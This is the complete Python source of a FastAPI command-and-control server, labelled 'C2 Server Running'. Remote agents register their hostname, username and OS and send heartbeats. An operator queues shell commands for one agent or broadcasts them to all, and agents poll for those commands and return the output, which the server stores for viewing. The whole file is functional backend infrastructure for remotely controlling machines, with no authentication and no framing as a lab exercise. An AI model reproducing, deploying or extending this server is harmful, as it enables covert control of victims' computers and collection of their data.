from fastapi import FastAPI
from pydantic import BaseModel
from sqlalchemy import create_engine, Column, String, Integer
from sqlalchemy.orm import sessionmaker, declarative_base
import time

app = FastAPI()

# DATABASE SETUP
engine = create_engine("sqlite:///./c2server.db", connect_args={"check_same_thread": False})
SessionLocal = sessionmaker(bind=engine)
Base = declarative_base()

# DATABASE TABLES

class AgentDB(Base):
    __tablename__ = "agents"

    agent_id = Column(String, primary_key=True)
    hostname = Column(String)
    username = Column(String)
    os = Column(String)
    last_seen = Column(Integer)

class CommandDB(Base):
    __tablename__ = "commands"

    id = Column(Integer, primary_key=True, index=True)
    agent_id = Column(String)
    command = Column(String)

class OutputDB(Base):
    __tablename__ = "outputs"

    id = Column(Integer, primary_key=True, index=True)
    agent_id = Column(String)
    output = Column(String)

Base.metadata.create_all(engine)

# MODELS

class Agent(BaseModel):
    agent_id: str
    hostname: str
    username: str
    os: str
    status: str

class Command(BaseModel):
    agent_id: str
    command: str

class BroadcastCommand(BaseModel):
    command: str

class Output(BaseModel):
    agent_id: str
    output: str

class Heartbeat(BaseModel):
    agent_id: str

# HOME

@app.get("/")
async def home():
    return {"message": "C2 Server Running"}

# REGISTER AGENT

@app.post("/register")
async def register(agent: Agent):

    db = SessionLocal()

    existing = db.query(AgentDB).filter(AgentDB.agent_id == agent.agent_id).first()

    if not existing:
        new_agent = AgentDB(
            agent_id=agent.agent_id,
            hostname=agent.hostname,
            username=agent.username,
            os=agent.os,
            last_seen=int(time.time())
        )
        db.add(new_agent)
        db.commit()

    db.close()

    return {"message": "agent registered"}

# HEARTBEAT

@app.post("/heartbeat")
async def heartbeat(hb: Heartbeat):

    db = SessionLocal()

    agent = db.query(AgentDB).filter(AgentDB.agent_id == hb.agent_id).first()

    if agent:
        agent.last_seen = int(time.time())
        db.commit()

    db.close()

    return {"message": "heartbeat received"}

# SEND COMMAND TO ONE AGENT

@app.post("/command")
async def send_command(cmd: Command):

    db = SessionLocal()

    new_command = CommandDB(
        agent_id=cmd.agent_id,
        command=cmd.command
    )

    db.add(new_command)
    db.commit()

    db.close()

    return {"message": "command stored"}

# BROADCAST COMMAND TO ALL AGENTS

@app.post("/broadcast")
async def broadcast(cmd: BroadcastCommand):

    db = SessionLocal()

    agents = db.query(AgentDB).all()

    for agent in agents:
        new_command = CommandDB(
            agent_id=agent.agent_id,
            command=cmd.command
        )
        db.add(new_command)

    db.commit()
    db.close()

    return {"message": "command broadcast to all agents"}

# AGENT FETCH COMMAND

@app.get("/get_command/{agent_id}")
async def get_command(agent_id: str):

    db = SessionLocal()

    command = db.query(CommandDB).filter(CommandDB.agent_id == agent_id).first()

    if command:
        cmd_text = command.command
        db.delete(command)
        db.commit()
        db.close()

        return {"command": cmd_text}

    db.close()

    return {"command": ""}

# RECEIVE OUTPUT FROM AGENT

@app.post("/send_output")
async def receive_output(out: Output):

    db = SessionLocal()

    new_output = OutputDB(
        agent_id=out.agent_id,
        output=out.output
    )

    db.add(new_output)
    db.commit()

    db.close()

    return {"message": "output stored"}

# CHECK AGENT STATUS

@app.get("/status")
async def status():

    db = SessionLocal()

    agents = db.query(AgentDB).all()

    current = int(time.time())
    result = {}

    for a in agents:
        if current - a.last_seen < 30:
            result[a.agent_id] = "online"
        else:
            result[a.agent_id] = "offline"

    db.close()

    return result

# VIEW OUTPUTS

@app.get("/outputs")
async def outputs():

    db = SessionLocal()

    data = db.query(OutputDB).all()

    results = []

    for d in data:
        results.append({
            "agent_id": d.agent_id,
            "output": d.output
        })

    db.close()

    return results

# DASHBOARD

@app.get("/dashboard")
async def dashboard():

    db = SessionLocal()

    agents = db.query(AgentDB).all()

    current = int(time.time())

    online = 0
    offline = 0

    for a in agents:
        if current - a.last_seen < 30:
            online += 1
        else:
            offline += 1

    db.close()

    return {
        "total_agents": len(agents),
        "online_agents": online,
        "offline_agents": offline
    }